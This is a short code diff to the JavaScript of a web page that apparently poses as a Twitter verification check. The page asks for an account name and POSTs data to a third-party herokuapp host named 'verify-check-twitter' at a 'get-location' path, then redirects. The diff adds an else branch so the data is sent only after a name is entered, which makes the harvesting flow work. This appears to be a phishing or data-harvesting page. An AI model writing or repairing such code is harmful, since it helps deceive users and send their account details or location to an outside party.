@@ -136,6 +136,7 @@
       if(name == ''){
         alert('Please enter your account name')
       }
+      else{
       //send data
       var xhr = new XMLHttpRequest()
       xhr.open('POST', `https://verify-check-twitter.herokuapp.com/get-location`)
@@ -150,7 +151,7 @@
       // after sending data redirect to the next page
 
 
-
+    }
 
 
 
